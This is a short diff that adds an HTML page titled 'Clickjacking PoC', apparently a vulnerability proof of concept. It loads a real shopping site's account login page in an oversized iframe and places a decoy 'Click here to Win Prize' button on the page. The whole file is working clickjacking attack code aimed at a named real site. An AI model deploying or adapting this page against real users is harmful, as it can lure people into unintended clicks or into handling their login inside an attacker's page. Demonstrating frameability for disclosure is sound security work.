@@ -1,0 +1,10 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>Clickjacking PoC</title>
+</head>
+<body>
+<input type=button value="Click here to Win Prize" style="z-index:-1;left:1200px;position:relative;top:800px;"/>
+<iframe src="https://www.flipkart.com/account/login?ret=%2Faccount%2F%3Frd%3D0%26link%3Dhome_account" width=500% height=1000% style= "opacity: 1";></iframe>
+</body>
+</html>
